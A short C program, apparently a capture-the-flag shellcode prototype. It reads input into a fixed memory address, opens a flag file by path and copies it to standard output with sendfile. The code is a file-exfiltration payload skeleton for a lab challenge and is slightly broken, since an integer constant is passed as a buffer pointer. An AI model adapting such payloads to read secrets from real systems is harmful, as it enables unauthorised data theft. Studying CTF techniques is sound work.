#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/sendfile.h>
#include <unistd.h>

#define RW_ADDR 0xdeadbeef

int main(){
    read(0, RW_ADDR, 900);
    int fd = openat(0, "/path/to/flag.txt",O_RDONLY); //0, 0
    sendfile(1, fd, 0, 0xffff);
return 0;}
